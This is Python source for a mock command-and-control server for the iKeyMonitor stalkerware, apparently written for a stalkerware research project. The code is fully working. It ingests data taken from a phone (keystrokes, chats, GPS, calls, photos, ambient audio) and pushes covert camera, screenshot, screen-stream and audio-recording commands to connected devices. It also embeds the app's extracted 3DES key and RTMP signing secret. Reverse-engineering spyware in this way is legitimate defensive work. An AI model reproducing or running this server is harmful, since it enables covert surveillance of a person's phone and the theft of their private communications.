"""
iKeyMonitor v17.4 + v19.1 Mock C2 Server
==========================================
Dual-version mock C2 supporting both the typo'd v17.4 endpoints and the corrected v19.1 endpoints.

Channels:
  - REST API (data exfiltration + config) via /index.php?m=api&a={action}
  - WebSocket (real-time commands: Camera, Screenshots, ScreenshotVideo, Surrounding)
  - Admin API (trigger commands, inspect state, crypto tools)

Usage:
    uv run uvicorn server:app --host 0.0.0.0 --port 8443 --ssl-keyfile key.pem --ssl-certfile cert.pem

Research use only — ASTRA/LHS-LORIA stalkerware analysis project.
"""

import base64
import hashlib
import json
import logging
import re
import time
import xml.etree.ElementTree as ET
from datetime import datetime
from pathlib import Path
from typing import Optional

from Crypto.Cipher import DES3
from Crypto.Util.Padding import pad, unpad
from fastapi import FastAPI, Query, Request, WebSocket, WebSocketDisconnect
from fastapi.responses import PlainTextResponse, JSONResponse

# ---------------------------------------------------------------------------
# Config — matches values extracted from APK (identical across v17.4 & v19.1)
# ---------------------------------------------------------------------------

TDES_KEY = b"ccc707d2924768f2cc12bc8b"           # 24-byte 3DES key
RTMP_SECRET = "C4hgdA%Qc5UHfqEho&Ke"             # RTMP signing secret
MOCK_UNIT_ID = "MSIK-ONLINE-MOCK001"
MOCK_LICENSE = "MOCK-LICENSE-ASTRA-2026"

LOG_DIR = Path("logs")
UPLOAD_DIR = Path("uploads")
for d in [LOG_DIR, UPLOAD_DIR, UPLOAD_DIR / "photos", UPLOAD_DIR / "screenshots",
          UPLOAD_DIR / "audio", UPLOAD_DIR / "video", UPLOAD_DIR / "chat_img",
          UPLOAD_DIR / "call_img", UPLOAD_DIR / "keystrokes", UPLOAD_DIR / "chats",
          UPLOAD_DIR / "gps", UPLOAD_DIR / "calls", UPLOAD_DIR / "web_history",
          UPLOAD_DIR / "clipboard", UPLOAD_DIR / "contacts", UPLOAD_DIR / "calendar",
          UPLOAD_DIR / "wifi", UPLOAD_DIR / "surrounding", UPLOAD_DIR / "debug",
          UPLOAD_DIR / "crash_logs"]:
    d.mkdir(parents=True, exist_ok=True)

# ---------------------------------------------------------------------------
# Logging
# ---------------------------------------------------------------------------

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler(LOG_DIR / "c2.log"),
    ],
)
log = logging.getLogger("ikm-c2")

# ---------------------------------------------------------------------------
# State
# ---------------------------------------------------------------------------

devices: dict[str, dict] = {}
exfiltrated: list[dict] = []
ws_connections: list[WebSocket] = []
command_queue: list[str] = []

# ---------------------------------------------------------------------------
# Endpoint mapping — v17.4 action → canonical v19.1 action
# Used to normalize old typo'd endpoints to their corrected form
# ---------------------------------------------------------------------------

ENDPOINT_ALIASES: dict[str, str] = {
    # v17.4 typos → v19.1 corrected
    "uoload_keystrokes": "upload_keystrokes",
    "uoload_chat_logs": "upload_chat_logs",
    "uoload_website_history": "upload_website_history",
    "uoload_call_history": "upload_call_history",
    "uoload_gps_history": "upload_gps_history",
    # v17.4 renamed → v19.1
    "surrounding": "upload_surrounding",
    "contact": "upload_contact",
    "calendar": "upload_calendar",
    "get_screenshot": "upload_screenshot",
    "upload_Wifi": "upload_wifi",
}

# Upload subdirectory routing
UPLOAD_SUBDIRS: dict[str, str] = {
    "upload_photo": "photos",
    "upload_chat_img": "chat_img",
    "upload_call_img": "call_img",
    "upload_screenvideo": "video",
    "upload_video": "video",
    "upload_surrounding": "surrounding",
    "upload_screenshot": "screenshots",
    "upload_keystrokes": "keystrokes",
    "upload_chat_logs": "chats",
    "upload_website_history": "web_history",
    "upload_call_history": "calls",
    "upload_gps_history": "gps",
    "upload_clipboard": "clipboard",
    "upload_contact": "contacts",
    "upload_calendar": "calendar",
    "upload_wifi": "wifi",
    "upload_debug_logs": "debug",
    "upload_weekly_crash_logs": "crash_logs",
}

# ---------------------------------------------------------------------------
# 3DES helpers
# ---------------------------------------------------------------------------

def tdes_encrypt(plaintext: str, key: bytes = TDES_KEY) -> str:
    """Reproduce 3DES/ECB encrypt -> hex -> base64 (C3443z.m7234b / C4687z.m11302b)."""
    cipher = DES3.new(key, DES3.MODE_ECB)
    ct = cipher.encrypt(pad(plaintext.encode("utf-8"), DES3.block_size))
    return base64.b64encode(ct.hex().encode()).decode()


def tdes_decrypt(b64hex: str, key: bytes = TDES_KEY) -> str:
    """Reverse of tdes_encrypt."""
    raw_hex = base64.b64decode(b64hex).decode()
    ct = bytes.fromhex(raw_hex)
    cipher = DES3.new(key, DES3.MODE_ECB)
    return unpad(cipher.decrypt(ct), DES3.block_size).decode("utf-8")


def rtmp_sign(device_id: str, sign_ts: str) -> str:
    """RTMP URL signature: MD5("/live/" + device_id + "-" + ts + "-" + secret)."""
    raw = f"/live/{device_id}-{sign_ts}-{RTMP_SECRET}"
    return hashlib.md5(raw.encode()).hexdigest()

# ---------------------------------------------------------------------------
# XML helpers
# ---------------------------------------------------------------------------

def xml_response(ret: str = "500", client: str = "", extra: str = "") -> str:
    """Build IKMService XML response."""
    ts = str(int(time.time()))
    return (
        f"<IKMService>"
        f"<Ret>{ret}</Ret>"
        f"<Client>{client}</Client>"
        f"<UnitID>{MOCK_UNIT_ID}</UnitID>"
        f"<MonitorStatus>0</MonitorStatus>"
        f"<WSTimeStamp>{ts}</WSTimeStamp>"
        f"{extra}"
        f"</IKMService>"
    )


def xml_command(request_type: str, request_id: str, body: str) -> str:
    """Build server->APK WebSocket command."""
    return (
        f"<IKMService>"
        f"<RequestType>{request_type}</RequestType>"
        f"<RequestId>{request_id}</RequestId>"
        f"{body}"
        f"</IKMService>"
    )


def parse_xml_field(xml_str: str, tag: str) -> str:
    """Quick regex XML field extractor."""
    m = re.search(rf"<{tag}>(.*?)</{tag}>", xml_str, re.DOTALL)
    return m.group(1) if m else ""

# ---------------------------------------------------------------------------
# Version detection
# ---------------------------------------------------------------------------

def detect_version(body_str: str, client: str) -> str:
    """Heuristic: detect APK version from request content."""
    if client in devices and "version" in devices[client]:
        return devices[client]["version"]
    if "com.sec.android" in body_str or "monitoringapp" in body_str:
        return "v17.4"
    if "com.android.internet" in body_str or "a20251031" in body_str:
        return "v19.1"
    return "unknown"

# ---------------------------------------------------------------------------
# FastAPI app
# ---------------------------------------------------------------------------

app = FastAPI(title="iKeyMonitor Mock C2", version="2.0.0",
              description="Dual-version: supports v17.4 (uoload typos) + v19.1 (corrected)")


def _normalize_action(action: str) -> str:
    """Normalize v17.4 typo'd actions to canonical v19.1 names."""
    return ENDPOINT_ALIASES.get(action, action)


def _log_request(action: str, canonical: str, request: Request, body: bytes, version: str):
    """Log every incoming request with version tagging."""
    entry = {
        "ts": datetime.now().isoformat(),
        "action_raw": action,
        "action_canonical": canonical,
        "version": version,
        "ip": request.client.host if request.client else "?",
        "body_len": len(body),
        "body_preview": body[:500].decode("utf-8", errors="replace"),
    }
    exfiltrated.append(entry)
    version_tag = f"[{version}]" if version != "unknown" else ""
    log.info(">>> [%s] %s from %s (%d bytes) %s",
             canonical, f"(raw: {action})" if action != canonical else "",
             entry["ip"], len(body), version_tag)


async def _save_upload(action: str, canonical: str, request: Request) -> bytes:
    """Read body, log, and save uploaded files."""
    body = await request.body()
    body_str = body.decode("utf-8", errors="replace")
    version = detect_version(body_str, parse_xml_field(body_str, "Client"))
    _log_request(action, canonical, request, body, version)

    content_type = request.headers.get("content-type", "")
    if "multipart" in content_type or len(body) > 1000:
        ts = int(time.time())
        subdir = UPLOAD_SUBDIRS.get(canonical, "misc")
        fpath = UPLOAD_DIR / subdir / f"{ts}_{canonical}.bin"
        fpath.parent.mkdir(parents=True, exist_ok=True)
        fpath.write_bytes(body)
        log.info("Saved %d bytes -> %s", len(body), fpath)

    return body


# ---------------------------------------------------------------------------
# REST API router
# ---------------------------------------------------------------------------

@app.api_route("/index.php", methods=["GET", "POST"])
async def api_router(request: Request, m: str = Query("api"), a: str = Query("")):
    """Main router -- dispatches based on ?m=api&a={action}."""
    canonical = _normalize_action(a)
    body = await _save_upload(a, canonical, request)
    body_str = body.decode("utf-8", errors="replace")
    client = parse_xml_field(body_str, "Client") or "unknown"
    version = detect_version(body_str, client)

    # Track device
    if client not in devices and client != "unknown":
        devices[client] = {
            "client_id": client,
            "first_seen": datetime.now().isoformat(),
            "last_seen": datetime.now().isoformat(),
            "version": version,
            "actions": [],
        }
    if client in devices:
        devices[client]["last_seen"] = datetime.now().isoformat()
        devices[client]["actions"].append(canonical)
        if version != "unknown":
            devices[client]["version"] = version

    handler = HANDLERS.get(canonical, _handle_generic)
    return await handler(request, body, body_str, client, canonical)


# --- Handler implementations ---

async def _handle_register(request, body, body_str, client, action):
    log.info("REGISTER device: %s", client)
    return PlainTextResponse(xml_response("500", client))


async def _handle_account(request, body, body_str, client, action):
    log.info("ACCOUNT check: %s", client)
    return PlainTextResponse(xml_response("500", client))


async def _handle_cycle(request, body, body_str, client, action):
    """Heartbeat -- respond with 500 (success) + optional embedded commands."""
    extra = ""
    if command_queue:
        for cmd in command_queue:
            if "<Surrounding>" in cmd:
                extra += cmd
    log.info("CYCLE from %s", client)
    return PlainTextResponse(xml_response("500", client, extra))


async def _handle_get_settings(request, body, body_str, client, action):
    log.info("GET_SETTINGS: %s", client)
    settings_xml = (
        "<Settings>"
        "<MonitoringEnabled>1</MonitoringEnabled>"
        "<ScreenshotInterval>300</ScreenshotInterval>"
        "<GpsInterval>300</GpsInterval>"
        "<KeystrokesEnabled>1</KeystrokesEnabled>"
        "<ChatLogsEnabled>1</ChatLogsEnabled>"
        "<CallRecordEnabled>1</CallRecordEnabled>"
        "<SurroundingEnabled>1</SurroundingEnabled>"
        "<WebHistoryEnabled>1</WebHistoryEnabled>"
        "<ClipboardEnabled>1</ClipboardEnabled>"
        "</Settings>"
    )
    return PlainTextResponse(xml_response("500", client, settings_xml))


async def _handle_set_settings(request, body, body_str, client, action):
    log.info("SET_SETTINGS from %s: %s", client, body_str[:200])
    return PlainTextResponse(xml_response("500", client))


async def _handle_get_websocket_address(request, body, body_str, client, action):
    host = request.headers.get("host", "127.0.0.1:8443")
    scheme = "wss" if "https" in str(request.url) else "ws"
    ws_url = f"{scheme}://{host}/ws"
    log.info("WS_ADDRESS requested by %s -> %s", client, ws_url)
    return PlainTextResponse(
        f"<IKMService><Ret>500</Ret><Client>{client}</Client>"
        f"<WSAddress>{ws_url}</WSAddress></IKMService>"
    )


async def _handle_check_update(request, body, body_str, client, action):
    log.info("CHECK_UPDATE: %s", client)
    return PlainTextResponse(
        f"<IKMService><Ret>500</Ret><Client>{client}</Client>"
        f"<UpdateAvailable>0</UpdateAvailable></IKMService>"
    )


async def _handle_upload_data(request, body, body_str, client, action):
    log.info("UPLOAD [%s] from %s (%d bytes)", action, client, len(body))
    return PlainTextResponse(xml_response("500", client))


async def _handle_generic(request, body, body_str, client, action):
    log.info("UNKNOWN action [%s] from %s", action, client)
    return PlainTextResponse(xml_response("500", client))


# Action -> handler mapping -- covers BOTH v17.4 AND v19.1 canonical names
HANDLERS = {
    # Control & auth
    "register": _handle_register,
    "account": _handle_account,
    "cycle": _handle_cycle,
    "get_settings": _handle_get_settings,
    "set_settings": _handle_set_settings,
    "get_websocket_address": _handle_get_websocket_address,
    "check_update": _handle_check_update,
    "download_update": _handle_generic,
    "reset_password": _handle_generic,
    "schedule_surround": _handle_generic,
    # Data exfiltration -- canonical (v19.1) names
    "upload_keystrokes": _handle_upload_data,
    "upload_chat_logs": _handle_upload_data,
    "upload_website_history": _handle_upload_data,
    "upload_call_history": _handle_upload_data,
    "upload_gps_history": _handle_upload_data,
    "upload_chat_img": _handle_upload_data,
    "upload_call_img": _handle_upload_data,
    "upload_wifi": _handle_upload_data,
    "upload_clipboard": _handle_upload_data,
    "upload_photo": _handle_upload_data,
    "upload_video": _handle_upload_data,
    "upload_screenvideo": _handle_upload_data,
    "upload_surrounding": _handle_upload_data,
    "upload_contact": _handle_upload_data,
    "upload_calendar": _handle_upload_data,
    "upload_screenshot": _handle_upload_data,
    "upload_debug_logs": _handle_upload_data,
    "upload_weekly_crash_logs": _handle_upload_data,
}


# ---------------------------------------------------------------------------
# WebSocket -- real-time command channel
# ---------------------------------------------------------------------------

@app.websocket("/ws")
async def websocket_endpoint(ws: WebSocket):
    await ws.accept()
    ws_connections.append(ws)
    log.info("WebSocket connected (total: %d)", len(ws_connections))

    on_connect = xml_command("onConnect", "0", "")
    await ws.send_text(on_connect)
    log.info("Sent onConnect handshake")

    try:
        while True:
            data = await ws.receive_text()
            log.info("WS recv: %s", data[:300])

            ret = parse_xml_field(data, "Ret")
            client = parse_xml_field(data, "Client")
            license_key = parse_xml_field(data, "License")
            req_type = parse_xml_field(data, "RequestType")

            if client and client not in devices:
                devices[client] = {
                    "client_id": client,
                    "first_seen": datetime.now().isoformat(),
                    "last_seen": datetime.now().isoformat(),
                    "license": license_key,
                    "version": "unknown",
                    "actions": ["ws_connect"],
                }
            if client and client in devices:
                devices[client]["last_seen"] = datetime.now().isoformat()
                devices[client]["license"] = license_key

            log.info("WS: client=%s license=%s ret=%s type=%s",
                     client, license_key[:20] if license_key else "?", ret, req_type)

            while command_queue:
                cmd = command_queue.pop(0)
                await ws.send_text(cmd)
                log.info("Pushed queued command: %s", cmd[:200])

    except WebSocketDisconnect:
        ws_connections.remove(ws)
        log.info("WebSocket disconnected (remaining: %d)", len(ws_connections))
    except Exception as e:
        if ws in ws_connections:
            ws_connections.remove(ws)
        log.error("WebSocket error: %s", e)


# ---------------------------------------------------------------------------
# Admin API
# ---------------------------------------------------------------------------

@app.get("/admin/status")
async def admin_status():
    return {
        "devices": list(devices.values()),
        "ws_connections": len(ws_connections),
        "exfiltrated_count": len(exfiltrated),
        "command_queue": len(command_queue),
        "supported_versions": ["v17.4", "v19.1"],
    }


@app.get("/admin/exfiltrated")
async def admin_exfiltrated(limit: int = 50):
    return {"count": len(exfiltrated), "data": exfiltrated[-limit:]}


@app.get("/admin/exfiltrated/by_type/{action}")
async def admin_exfiltrated_by_type(action: str, limit: int = 50):
    """Filter exfiltrated data by canonical action name."""
    filtered = [e for e in exfiltrated if e.get("action_canonical") == action]
    return {"count": len(filtered), "data": filtered[-limit:]}


@app.get("/admin/endpoints")
async def admin_endpoints():
    """Show endpoint mapping: v17.4 -> v19.1 canonical names."""
    return {
        "aliases": ENDPOINT_ALIASES,
        "canonical_endpoints": sorted(HANDLERS.keys()),
        "upload_dirs": UPLOAD_SUBDIRS,
    }


@app.post("/admin/cmd/camera")
async def admin_cmd_camera(camera_type: str = "front"):
    req_id = str(int(time.time()))
    cmd = xml_command("camera_snap", req_id,
                      f"<Camera><Enable>1</Enable><Type>{camera_type}</Type></Camera>")
    sent = 0
    for ws in ws_connections:
        try:
            await ws.send_text(cmd)
            sent += 1
        except Exception as e:
            log.error("Failed to send camera cmd: %s", e)
    log.info("Camera command sent (type=%s) to %d connections", camera_type, sent)
    return {"status": "sent", "type": camera_type, "connections": sent}


@app.post("/admin/cmd/screenshot")
async def admin_cmd_screenshot():
    req_id = str(int(time.time()))
    cmd = xml_command("screenshot_snap", req_id,
                      "<Screenshots><Enable>1</Enable></Screenshots>")
    sent = 0
    for ws in ws_connections:
        try:
            await ws.send_text(cmd)
            sent += 1
        except Exception as e:
            log.error("Failed to send screenshot cmd: %s", e)
    log.info("Screenshot command sent to %d connections", sent)
    return {"status": "sent", "connections": sent}


@app.post("/admin/cmd/screenstream")
async def admin_cmd_screenstream(enable: int = 1):
    req_id = str(int(time.time()))
    sign_ts = str(int(time.time()))
    cmd = xml_command("screen_video", req_id,
                      f"<ScreenshotVideo><Enable>{enable}</Enable></ScreenshotVideo>"
                      f"<SignTimeStamp>{sign_ts}</SignTimeStamp>")
    sent = 0
    for ws in ws_connections:
        try:
            await ws.send_text(cmd)
            sent += 1
        except Exception as e:
            log.error("Failed to send screenstream cmd: %s", e)
    log.info("Screen stream command sent (enable=%d) to %d connections", enable, sent)
    return {"status": "sent", "enable": enable, "sign_ts": sign_ts, "connections": sent}


@app.post("/admin/cmd/surrounding")
async def admin_cmd_surrounding(enable: int = 1, duration: int = 60):
    req_id = str(int(time.time()))
    cmd = xml_command("surround_rec", req_id,
                      f"<Surrounding><Enable>{enable}</Enable>"
                      f"<Duration>{duration}</Duration></Surrounding>")
    sent = 0
    for ws in ws_connections:
        try:
            await ws.send_text(cmd)
            sent += 1
        except Exception as e:
            log.error("Failed to send surrounding cmd: %s", e)
    log.info("Surrounding command sent (enable=%d, duration=%ds) to %d connections",
             enable, duration, sent)
    return {"status": "sent", "enable": enable, "duration": duration, "connections": sent}


@app.post("/admin/cmd/raw")
async def admin_cmd_raw(request: Request):
    body = await request.body()
    xml_str = body.decode("utf-8")
    sent = 0
    for ws in ws_connections:
        try:
            await ws.send_text(xml_str)
            sent += 1
        except Exception as e:
            log.error("Failed to send raw cmd: %s", e)
    log.info("Raw command sent to %d connections", sent)
    return {"status": "sent", "connections": sent}


# ---------------------------------------------------------------------------
# Crypto admin
# ---------------------------------------------------------------------------

@app.get("/admin/crypto/encrypt")
async def admin_crypto_encrypt(plaintext: str = "test"):
    return {"plaintext": plaintext, "encrypted": tdes_encrypt(plaintext)}


@app.get("/admin/crypto/decrypt")
async def admin_crypto_decrypt(ciphertext: str = ""):
    try:
        return {"ciphertext": ciphertext, "decrypted": tdes_decrypt(ciphertext)}
    except Exception as e:
        return {"error": str(e)}


@app.get("/admin/crypto/rtmp_sign")
async def admin_crypto_rtmp(device_id: str = "test", sign_ts: str = ""):
    if not sign_ts:
        sign_ts = str(int(time.time()))
    sig = rtmp_sign(device_id, sign_ts)
    url = f"rtmp://{{RTMP_SERVER}}/{device_id}?sign={sign_ts}-{sig}"
    return {"device_id": device_id, "sign_ts": sign_ts, "md5": sig, "url": url}
